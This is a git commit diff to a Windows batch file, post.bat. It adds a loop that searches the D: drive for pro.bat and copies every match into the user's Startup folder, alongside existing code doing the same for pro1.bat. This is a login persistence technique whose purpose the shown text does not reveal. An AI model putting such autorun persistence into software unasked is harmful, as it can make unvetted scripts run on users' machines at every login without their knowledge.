6c1df7190fea1aecf0909ef4215b382c1155b39e
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 18:54:52 +0300

    Update post.bat

--- post.bat
+++ post.bat
@@ -1,3 +1,7 @@
+for /R "D:\" %%i in (pro.bat) do (
+    copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+)
+
 for /R "%USERPROFILE%" %%i in (pro1.bat) do (
     copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 )
